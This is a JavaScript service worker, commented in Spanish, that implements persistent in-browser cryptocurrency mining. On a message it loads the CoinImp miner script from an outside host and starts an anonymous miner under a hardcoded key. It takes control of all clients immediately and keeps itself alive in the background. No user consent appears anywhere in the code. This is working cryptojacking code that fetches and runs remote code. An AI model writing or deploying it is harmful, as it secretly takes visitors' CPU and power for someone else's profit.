// Configuración
const CLIENT_KEY = '54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af';

// Evento de instalación
self.addEventListener('install', event => {
    self.skipWaiting();  // Tomar control inmediato
    console.log('[SW] Service Worker instalado');
});

// Evento de activación
self.addEventListener('activate', event => {
    clients.claim();  // Controlar todos los clientes
    console.log('[SW] Service Worker activado');
});

// Manejar mensajes
self.addEventListener('message', event => {
    if (event.data.type === 'START_MINING') {
        console.log('[SW] Recibido comando para iniciar minería');
        startMining(event.data.key);
    }
});

// Función para iniciar minería
function startMining(apiKey) {
    console.log('[SW] Iniciando minería persistente');
    
    // 1. Cargar script de CoinImp
    importScripts('https://www.hostingcloud.racing/ADTj.js');
    
    // 2. Configurar minero
    if (typeof Client !== 'undefined') {
        self._client = new Client.Anonymous(apiKey, {
            throttle: 0.15,
            c: 'w',
            ads: 0
        });
        
        // 3. Iniciar minería
        self._client.start();
        console.log('[SW] Minería persistente iniciada');
        
        // 4. Mantener vivo el worker
        setInterval(() => {
            // Simular actividad para mantener vivo el worker
            console.log('[SW] Minería activa en segundo plano');
        }, 30000);
    } else {
        console.error('[SW] Error: Script de CoinImp no se cargó correctamente');
    }
}

// Manejar errores
self.addEventListener('error', event => {
    console.error('[SW] Error en Service Worker:', event.error);
});
